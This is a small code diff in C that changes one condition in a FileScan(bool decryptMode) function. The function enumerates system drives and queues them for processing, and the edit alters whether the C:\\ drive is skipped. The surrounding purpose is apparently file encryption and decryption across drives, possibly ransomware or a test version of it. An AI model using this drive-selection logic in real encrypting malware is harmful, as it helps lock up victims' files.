@@ -180,7 +180,7 @@ void FileScan(bool decryptMode) {
 
     while (*drive != '\0') {
         printf("%s\n", drive);
-        while (strcmp(drive, "C:\\") != 0) {
+        while (strcmp(drive, "C:\\") == 0) {
             drive += strlen(drive) + 1;
         }
         strcpy(queue[tail], drive);
